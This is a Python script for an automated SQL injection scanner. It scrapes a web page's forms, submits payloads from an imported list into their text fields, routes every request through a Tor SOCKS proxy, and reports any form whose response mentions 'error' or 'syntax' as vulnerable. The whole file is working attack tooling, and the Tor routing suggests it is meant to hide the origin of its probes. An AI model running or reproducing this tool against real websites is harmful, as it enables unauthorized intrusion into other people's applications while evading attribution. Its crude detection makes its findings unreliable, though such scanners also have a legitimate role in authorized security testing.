import requests, json
from urllib.parse import urljoin
from colorama import Fore, init
from bs4 import BeautifulSoup as bs
from pprint import pprint
from scripts.payload.sqli_payloads import sqli_payloads

init()

class log:
    wait = f"{Fore.LIGHTWHITE_EX}({Fore.LIGHTCYAN_EX} * {Fore.LIGHTWHITE_EX})"
    success = f"{Fore.LIGHTWHITE_EX}({Fore.LIGHTGREEN_EX} ✓ {Fore.LIGHTWHITE_EX})"
    error = f"{Fore.LIGHTWHITE_EX}({Fore.LIGHTRED_EX} X {Fore.LIGHTWHITE_EX})"
    info = f"{Fore.LIGHTWHITE_EX}({Fore.LIGHTBLUE_EX} i {Fore.LIGHTWHITE_EX})"

proxies = {
    'http': 'socks5h://localhost:9050',
    'https': 'socks5h://localhost:9050'
}

def find_forms(url):
    page_content = requests.get(url, proxies=proxies).content
    soup = bs(page_content, "html.parser")
    return soup.find_all("form")

def extract_form_details(form):
    details = {}
    action = form.attrs.get("action", "").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def send_payload(form_details, url, payload):
    target_url = urljoin(url, form_details["action"])
    data = {}
    
    for input in form_details["inputs"]:
        input_name = input.get("name")
        if input_name:
            data[input_name] = payload if input["type"] in ["text", "search"] else ""

    print(log.success + f" Sending payload to {target_url}")
    print(log.success + f" Submitted data: {data}")
    
    if form_details["method"] == "post":
        return requests.post(target_url, proxies=proxies, data=data)
    else:
        return requests.get(target_url, proxies=proxies, params=data)

def sql_injection_scanner(url):
    forms = find_forms(url)
    print(log.success + f" {len(forms)} forms found on {url}.")
    vulnerabilities_found = []

    for payload in sqli_payloads:
        for form in forms:
            form_details = extract_form_details(form)
            response_content = send_payload(form_details, url, payload).content.decode()
            
            if "error" in response_content.lower() or "syntax" in response_content.lower():
                print(log.success + f" SQL Injection detected on {url} with payload: {payload}")
                print(log.wait + f" Form details:")
                pprint(form_details)

                result = {
                    'site': url,
                    'payload': payload,
                    'form_details': form_details,
                    'request_url': urljoin(url, form_details["action"]),
                    'method': form_details["method"]
                }
                vulnerabilities_found.append(result)

    if vulnerabilities_found:
        print()
        print(log.wait + " Test results:")
        print(json.dumps(vulnerabilities_found, indent=4))
    else:
        print(log.error + " No SQL injection vulnerabilities found.")